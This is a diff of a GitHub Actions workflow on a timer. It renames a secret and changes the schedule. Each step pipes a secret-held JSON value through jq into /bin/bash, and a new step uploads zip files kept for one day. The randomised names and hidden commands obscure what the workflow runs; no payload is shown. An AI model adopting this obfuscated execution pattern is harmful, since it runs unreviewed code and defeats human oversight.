@@ -1,27 +1,27 @@
 name: jiebanzhuai
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '49 4/6 * * *'
-jobs:  # 4554
+    - cron: '10 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiebanzhuai
         env:
-          euiy32: ${{ secrets.euiy32 }}
+          dms5581: ${{ secrets.dms5581 }}
         run: |
-          echo $euiy32 | jq -r .paj62188 | /bin/bash
-          echo $dhf3670 | jq -r .xeha17 | /bin/bash
-          echo $htvoq8 | jq -r .f20 | /bin/bash
-          echo $yjkbr8 | jq -r .emcmm5 | /bin/bash
-          echo $f003 | jq -r .goc615 | /bin/bash
-          echo $jhw4050 | jq -r .znd48285 | /bin/bash
-          echo $c8819 | jq -r .wczbq9 | /bin/bash
-          echo $bgk05 | jq -r .ikpu00531 | /bin/bash
-          echo $mnurc7446 | jq -r .dnyrd7269 | /bin/bash
-          echo $f8 | jq -r .cbam23268 | /bin/bash
+          printf '%s' "$dms5581" | jq -r .nn9 | /bin/bash
+          echo $tnwg64249 | jq -r .xm6468 | /bin/bash
+          printf '%s' "$ema04508" | jq -r .p2463 | /bin/bash
+          printf '%s' "$ix732" | jq -r .ta0797 | /bin/bash
+          echo $lhsly84 | jq -r .v776 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ixoAF7rL
+          path: "*.zip"
+          retention-days: 1
